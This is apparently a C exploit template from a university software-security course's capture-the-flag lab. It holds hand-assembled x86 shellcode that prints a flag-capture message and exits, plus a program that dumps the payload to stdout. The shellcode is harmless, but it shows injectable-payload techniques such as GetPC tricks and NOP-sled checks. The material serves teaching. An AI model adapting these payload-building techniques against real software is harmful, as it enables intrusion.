/*
 * CTF-1 `vcat1' exploit (template)
 *
 * Vasileios P. Kemerlis <vpk@cs.brown.edu>
 *  - CSCI 1650: Software Security and Exploitation
 *  - https://cs.brown.edu/courses/csci1650/
 */

#include <stdlib.h>
#include <unistd.h>


/* FIXME */
unsigned char payload[] =
	/* ------------------------------------	*/
	"\x8b\x5c\x24\xfc"		/*[-_^]	*/
	"\xeb\x03"			/* M	*/
	"\x58"				/* A	*/
	"\xeb\x05"			/* G	*/
	"\xe8\xf8\xff\xff\xff"		/* I	*/
	"\x2c\x0e"			/* C	*/
	"\x39\xc4"			/*[^_-]	*/
	/* ------------------------------------	*/
	 "\x83\xc4\x40"	/* add $0x40, %esp	*/
	/* ------------------------------------	*/
	/*
	 * push
	 * "\n[+] w00t!\n[+] Congratulations, you captured 'Flag 4/5/6'!\n\0"
	 */
	"\x68" "\x27\x21\x0a\x00"
	"\x75\x07"
	"\x68" "\x61\x67\x20\x36"
	"\xeb\x1f"
	"\x39\xc3"
	"\x74\x16"
	"\x39\xcb"
	"\x74\x12"
	"\x80\x3b\x90"
	"\x75\x0d"
	"\x80\x7b\xff\x90"
	"\x75\x07"
	"\x68" "\x61\x67\x20\x35"
	"\xeb\x05"
	"\x68" "\x61\x67\x20\x34"
	"\x68" "\x20\x27\x46\x6c"
	"\x68" "\x75\x72\x65\x64"
	"\x68" "\x63\x61\x70\x74"
	"\x68" "\x79\x6f\x75\x20"
	"\x68" "\x6e\x73\x2c\x20"
	"\x68" "\x61\x74\x69\x6f"
	"\x68" "\x61\x74\x75\x6c"
	"\x68" "\x6f\x6e\x67\x72"
	"\x68" "\x2b\x5d\x20\x43"
	"\x68" "\x74\x21\x0a\x5b"
	"\x68" "\x20\x77\x30\x30"
	"\x68" "\x0a\x5b\x2b\x5d"
	"\x89\xe1"	/* mov    %esp, %ecx	*/
	"\x6a\x38"	/* push   $0x38		*/ /* sizeof(str)		*/
	"\x5a"		/* pop    %edx		*/
	"\x6a\x01"	/* push   $0x1		*/ /* write(...)		*/
	"\x5b"		/* pop    %ebx		*/ /* arg0: STDOUT_FILENO	*/
	"\x6a\x04"	/* push   $0x4		*/ /* arg1: &"\n..."		*/
	"\x58"		/* pop    %eax		*/ /* arg2: sizeof(str)		*/
	"\xcd\x80"	/* int    $0x80		*/
	/* ------------------------------------	*/
	"\x6a\x00"	/* push   $0x0		*/
	"\x5b"		/* pop    %ebx		*/
	"\x6a\x01"	/* push   $0x1		*/ /* exit(EXIT_SUCCESS)	*/
	"\x58"		/* pop    %eax		*/
	"\xcd\x80"	/* int    $0x80		*/
	/* ------------------------------------	*/
	;

int
main(int argc, char **argv)
{
	/*
	 * dump the payload in 'stdout'
	 * sizeof(payload)-1:	ignore the trailing '\0';
	 *			(strings are NULL terminated)
	 */
	write(STDOUT_FILENO, payload, sizeof(payload)-1);

	/* done; success		*/
	return EXIT_SUCCESS;
}
